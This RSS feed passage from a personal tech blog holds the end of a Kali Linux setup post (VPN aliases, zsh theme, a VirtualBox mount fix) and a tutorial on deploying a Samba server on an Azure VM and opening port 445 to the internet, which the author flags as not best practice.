alias htbon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/htb-sg.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias htbfort<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/htb-fortress.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias htbrel<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/htb-release.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias thmon<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/thm.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias thmwreath<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;openvpn ~/ovpnconfig/thm-wreath.ovpn 1&gt;/dev/null &amp;&#39;</span>
alias kvpn<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pkill openvpn&#39;</span>
alias hostit<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;python3 -m http.server -d ~/tools 8000&#39;</span>
</code></pre></div><p>The next step is depending on your theme, I use a theme called <code>robbyrussell</code>. I created a copy of the theme in <code> /home/kali/.oh-my-zsh/custom/themes/robbyrussell.zsh-theme</code> and modified the theme to display prompt in two line with IP address. The modified version as follows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">NEWLINE=$&#39;\n$&#39; 
PROMPT=&#39;%(?:%{$fg_bold[green]%}→:%{$fg_bold[red]%}→)&#39;
PROMPT+=&#39; %F{4}%n@%m %{$fg[cyan]%}«%c»%{$reset_color%}&#39;
PROMPT+=&#39; %B%F{152}«$(get_ip)»%f%b $(git_prompt_info)&#39;
PROMPT+=&#34;%F{31}${NEWLINE} %f&#34;

ZSH_THEME_GIT_PROMPT_PREFIX=&#34;%{$fg_bold[blue]%}git:(%{$fg[red]%}&#34;
ZSH_THEME_GIT_PROMPT_SUFFIX=&#34;%{$reset_color%} &#34;
ZSH_THEME_GIT_PROMPT_DIRTY=&#34;%{$fg[blue]%}) %{$fg[yellow]%}✗&#34;
ZSH_THEME_GIT_PROMPT_CLEAN=&#34;%{$fg[blue]%})&#34;
</code></pre></div><p>Finally, load the <code>ctf</code> plugin we created in <code>.zshrc</code> file.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">...[SNIP]...
# Which plugins would you like to load?
# Standard plugins can be found in $ZSH/plugins/
# Custom plugins may be added to $ZSH_CUSTOM/plugins/
# Example format: plugins=(rails git textmate ruby lighthouse)
# Add wisely, as too many plugins slow down shell startup.
plugins=(git ctf)

...[SNIP]...
</code></pre></div><p>Restart your terminal and we&rsquo;re done.</p>
<p><img class="img-container" src="imgs/image-20210711221808834.png" alt="image-20210711221808834"  />
</p>
<p>In the next section, I provided some problems I found during using this newer Kali VM you can skip it.</p>
<p>And that&rsquo;s all for this post!</p>
<h2 id="problem-with-kali-linux-20212">Problem with Kali Linux 2021.2</h2>
<h3 id="font-too-small-unresolved">Font too small (Unresolved)</h3>
<p>My current problem with Kali Linux 2021.2 is that the menu font in qterminal cannot be resized like I did with 2019.4 and this is quite annoying 🙃.</p>
<p><img class="img-container" src="imgs/image-20210709052634017.png" alt="image-20210709052634017"  />
</p>
<h3 id="permission-denied-on-installing-virtualbox-guest-addition-solved">Permission Denied on Installing VirtualBox Guest Addition (Solved)</h3>
<p>If you face this error even after trying to install VirtualBox Guest Addition with sudo.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> sudo: unable to execute ./VBoxLinuxAdditions.run: Permission denied.
</code></pre></div><p>The cause is probably you mounted the cd with <code>no exec</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mount -v | grep media                      
/dev/sr0 on /media/cdrom0 type iso9660 <span style="color:#f92672">(</span>ro,nosuid,nodev,relatime,nojoliet,check<span style="color:#f92672">=</span>s,map<span style="color:#f92672">=</span>n,blocksize<span style="color:#f92672">=</span>2048,user<span style="color:#f92672">)</span> 
</code></pre></div><p>To resolve it, remount the cd of Guest Addition with <code>exec</code>.</p>
<pre><code>$ sudo mount -o remount,ro,exec /media/cdrom0       
</code></pre><hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54">https://medium.com/risan/upgrade-your-ssh-key-to-ed25519-c6e8d60d3c54</a></li>
<li><a href="https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background">https://askubuntu.com/questions/750419/how-do-i-run-a-sudo-command-needing-password-input-in-the-background</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Setup a Samba Server in Azure and Make It Accessible Over Internet</title>
      <link>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure-and-make-it-accessible-over-internet/</link>
      <pubDate>Sun, 04 Jul 2021 19:45:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/setup-a-samba-server-in-azure-and-make-it-accessible-over-internet/</guid>
      <description>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.
In this post, I’ll share my documentation on how to setup a Samba server in Azure.
Before proceeding further, I&amp;rsquo;ll state that:
 Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &amp;lsquo;best practice&amp;rsquo;.</description>
      <content:encoded><![CDATA[<p>Last month, I was asked to setup a Samba/SMB server that is accessible over the Internet. Because it will only be used temporarily, I decided to use an Azure Virtual Machine (VM) instead of buying a dedicated VPS.</p>
<p>In this post, I’ll share my documentation on how to setup a Samba server in Azure.</p>
<p>Before proceeding further, I&rsquo;ll state that:</p>
<blockquote>
<p>Exposing an SMB Server directly to the Internet is not recommended, or not considered to be &lsquo;best practice&rsquo;. The safest way to make it accessible over the Internet is by setting up a VPN server and putting the SMB inside the VPN network.</p>
</blockquote>
<h2 id="goals-and-outcomes">Goals and Outcomes</h2>
<p>The goal here is exactly the same as what’s written in the title, but by the end of this post, you will be able to:</p>
<ul>
<li>Deploy an Ubuntu server in Azure</li>
<li>Setup and Configure a Samba server</li>
<li>Exposing Samba server over Internet</li>
</ul>
<h2 id="prerequisites">Prerequisites</h2>
<p>The one and only prerequisite is:</p>
<ul>
<li>Azure Account</li>
</ul>
<p>Also, since this post won&rsquo;t be detailed step by step, I&rsquo;ll assume that you have:</p>
<ul>
<li>Basic knowledge of Azure, at least menu navigation and creating a resource group.</li>
<li>Basic knowledge of Linux</li>
</ul>
<p>Let&rsquo;s jump in!</p>
<h2 id="vm-configuration--deploy">VM Configuration &amp; Deploy</h2>
<p>At this step, I already have a resource group called <code>IAMF_SMB-TEST</code> and I&rsquo;ll be creating a VM instance inside this resource. It&rsquo;s a small server used by 4-5 users, so B1s will be enough. You&rsquo;re free to customize the VM.</p>
<p>The VM details of mine can be seen in the following image:</p>
<p><img class="img-container" src="imgs/image-20210513170545346.png" alt="image-20210513170545346"  />
</p>
<p>For authentication to the server, I&rsquo;ll be using an SSH public key here instead of a password. The account for server administration is called <code>azure-smb</code>. Since the authentication is SSH, this VM will have an SSH port open publicly (internet).</p>
<p><img class="img-container" src="imgs/image-20210513170638603.png" alt="image-20210513170638603"  />
</p>
<p>In the following section, I&rsquo;ll use a standard SSD and leave the other settings at their defaults.</p>
<p><img class="img-container" src="imgs/image-20210513170710958.png" alt="image-20210513170710958"  />
</p>
<p>In the <strong>Networking</strong> section, I&rsquo;ll just create a new virtual network. See the following image for details:</p>
<p><img class="img-container" src="imgs/image-20210513170824172.png" alt="image-20210513170824172"  />
</p>
<p>In the <strong>Management</strong> section, because it will be temporary, I&rsquo;ll just disable the boot diagnostics.</p>
<p><img class="img-container" src="imgs/image-20210513171009570.png" alt="image-20210513171009570"  />
</p>
<p>I&rsquo;ll leave the <strong>Advanced</strong> with the default settings and skip the <strong>Tags</strong> section.</p>
<p>The last section is <strong>Review + Create</strong>, which basically reviews the VM configuration. After I finish the review, I&rsquo;ll press the <strong>Create</strong> button.</p>
<p><img class="img-container" src="imgs/image-20210513171153896.png" alt="image-20210513171153896"  />
</p>
<p>When the <strong>Create</strong> button is clicked, the VM will be automatically deployed.</p>
<p><img class="img-container" src="imgs/image-20210513171501031.png" alt="image-20210513171501031"  />
</p>
<h2 id="vm-login-via-ssh">VM Login via SSH</h2>
<p>The next step is to login to the deployed VM instance via SSH using the previously created username and key/password. The public IP of the VM instance can be found at the <code>Dashboard</code> &gt; <code>RESOURCE_GROUP_NAME</code> &gt; <code>PUBLIC_IP_NAME</code>. In my case, it is <code>Dashboard</code> &gt; <code>IAMF_SMB-TEST</code> &gt; <code>smb-server-ip</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ssh -i private_key azure-smb@PUBLIC_IP_ADDRESS
</code></pre></div><p><img class="img-container" src="imgs/image-20210513171606268.png" alt="image-20210513171606268"  />
</p>
<h2 id="smb-configuration">SMB Configuration</h2>
<h3 id="installation-and-initial-setup">Installation and Initial Setup</h3>
<p>First thing first, let&rsquo;s update the repository list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt update
</code></pre></div><p>After that, install <code>Samba</code> with the following command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo apt install samba
</code></pre></div><p>Once the installation is done, check the Samba service daemon status.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo systemctl status smbd
● smbd.service - Samba SMB Daemon
   Loaded: loaded <span style="color:#f92672">(</span>/lib/systemd/system/smbd.service; enabled; vendor preset: enabled<span style="color:#f92672">)</span>
   Active: active <span style="color:#f92672">(</span>running<span style="color:#f92672">)</span> since Thu 2021-05-13 10:17:45 UTC; 3min 48s ago
     Docs: man:smbd<span style="color:#f92672">(</span>8<span style="color:#f92672">)</span>
           man:samba<span style="color:#f92672">(</span>7<span style="color:#f92672">)</span>
           man:smb.conf<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>
 Main PID: <span style="color:#ae81ff">2098</span> <span style="color:#f92672">(</span>smbd<span style="color:#f92672">)</span>
   Status: <span style="color:#e6db74">&#34;smbd: ready to serve connections...&#34;</span>
    Tasks: <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>limit: 1056<span style="color:#f92672">)</span>
   CGroup: /system.slice/smbd.service
           ├─2098 /usr/sbin/smbd --foreground --no-process-group
           ├─2123 /usr/sbin/smbd --foreground --no-process-group
           ├─2124 /usr/sbin/smbd --foreground --no-process-group
           └─2129 /usr/sbin/smbd --foreground --no-process-group

May <span style="color:#ae81ff">13</span> 10:17:44 smb-server systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Starting Samba SMB Daemon...
May <span style="color:#ae81ff">13</span> 10:17:45 smb-server systemd<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>: Started Samba SMB Daemon.
</code></pre></div><p>Samba is ready, and now let&rsquo;s configure the share folder.</p>
<h3 id="shares-configuration">Shares Configuration</h3>
<p>First, let&rsquo;s create a backup file of the original configuration, so we can reset it to the default configuration, just in case something goes wrong.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo cp /etc/samba/smb.conf<span style="color:#f92672">{</span>,.backup<span style="color:#f92672">}</span>
</code></pre></div><p>Now create a share folder name it <code>sambashare</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ mkdir sambashare
</code></pre></div><p>Then open the samba configuration file with a text editor like <code>nano</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo nano /etc/samba/smb.conf
</code></pre></div><p>Go straight to the bottom of the file and add the following lines.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>sambashare<span style="color:#f92672">]</span>
    comment <span style="color:#f92672">=</span> Samba Share
    path <span style="color:#f92672">=</span> /home/azure-smb/sambashare
    read only <span style="color:#f92672">=</span> no
    browsable <span style="color:#f92672">=</span> yes
</code></pre></div><p>Details for configuring share can be read <a href="https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html">here</a> or <a href="https://web.mit.edu/rhel-doc/5/RHEL-5-manual/Deployment_Guide-en-US/s1-samba-configuring.html">here</a>.</p>
<p>Save the file and restart the SMB daemon with the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo service smbd restart
</code></pre></div><p>Lastly, update the firewall to allow network traffic for Samba/SMB.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo ufw allow samba
</code></pre></div><p>This is the basic configuration of creating a Samba share, but from here you can create another share with more complex configuration. Here are my references:</p>
<ul>
<li><a href="https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/">https://linuxize.com/post/how-to-install-and-configure-samba-on-ubuntu-18-04/</a></li>
<li><a href="https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user">https://confluence.jaytaala.com/display/TKB/Create+samba+share+writeable+by+all%2C+group%2C+or+only+a+user</a></li>
<li><a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04">https://www.digitalocean.com/community/tutorials/how-to-set-up-a-samba-share-for-a-small-organization-on-ubuntu-16-04</a></li>
</ul>
<h3 id="add-samba-user">Add Samba User</h3>
<p>Currently, our Linux account for administering the server is <code>azure-smb</code> and we can&rsquo;t use this account password to access the SMB shares yet. Instead, we need to create a password and bind it to <code>azure-smb</code>.</p>
<p>But now, let&rsquo;s just create a dedicated user for SMB called <code>user1</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo useradd --system -s /usr/sbin/nologin user1
</code></pre></div><p>Assign <code>user1</code> to be the owner of the share</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo chown user1 /home/azure-smb/sambashare
</code></pre></div><p>After that, create a Samba password for <code>user1</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -a user1
New SMB password: 
Retype new SMB password: 
Added user user1.
</code></pre></div><p>Finally, enable the user.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">azure-smb@smb-server:~$ sudo smbpasswd -e user1
Enabled user user1.
</code></pre></div><h2 id="expose-to-internet">Expose to Internet</h2>
<h3 id="allow-inbound-connection">Allow Inbound Connection</h3>
<p>Now if we want to make it available on the Internet, we have to go back to the Azure Portal to open the SMB port (445) on the NIC Public IP and allow inbound connection through that port. The connection is then forwarded to our SMB port on the NIC Private IP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">PUBLIC_IP:445 --&gt; PRIVATE_IP:445
</code></pre></div><p>To do that open up the Networking settings of the SMB VM and click on <strong>Add inbound port rule</strong> button.</p>
<p><img class="img-container" src="imgs/image-20210513173838694.png" alt="image-20210513173838694"  />
</p>
<p>On the new Windows, configure the rule to allow any source (incoming IP) and any source port (incoming port) to connect to the SMB port (445). The details configuration is as follows:</p>
<p><img class="img-container" src="imgs/image-20210513173858659.png" alt="image-20210513173858659"  />
</p>
<p>At the bottom, the configuration is as follows:</p>
<p><img class="img-container" src="imgs/image-20210513173929271.png" alt="image-20210513173929271"  />
</p>
<p>When you&rsquo;re done, click on the <strong>Add</strong> button and the new rule should listed in the <strong>Inbound port rules</strong> section.</p>
<p><img class="img-container" src="imgs/image-20210513174018895.png" alt="image-20210513174018895"  />
</p>
<h3 id="test-access">Test Access</h3>
<p>We can use Nmap to see if the SMB port has been opened.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nmap -p445 -sV VM_PUBLIC_IP
</code></pre></div><p><img class="img-container" src="imgs/image-20210513174227862.png" alt="image-20210513174227862"  />
</p>
<p>To interact with the SMB server via CLI, you can use <code>smbclient</code>. Install it with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo apt install smbclient
</code></pre></div><p>Once it installed, connect to the share with following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> 
</code></pre></div><p>Adding <code>-N -L</code> can list all the available shares.</p>
<p><img class="img-container" src="imgs/image-20210513174416250.png" alt="image-20210513174416250"  />
</p>
<p>You can also provide the password directly in the terminal:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> -U <span style="color:#f92672">[</span>username<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>password<span style="color:#f92672">]</span>
$ smbclient //<span style="color:#f92672">[</span>IP<span style="color:#f92672">]</span>/<span style="color:#f92672">[</span>sharename<span style="color:#f92672">]</span> -U <span style="color:#e6db74">&#39;username%password&#39;</span>
</code></pre></div><p>And that&rsquo;s all. It is not that detailed, but I hope you will find it useful.</p>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
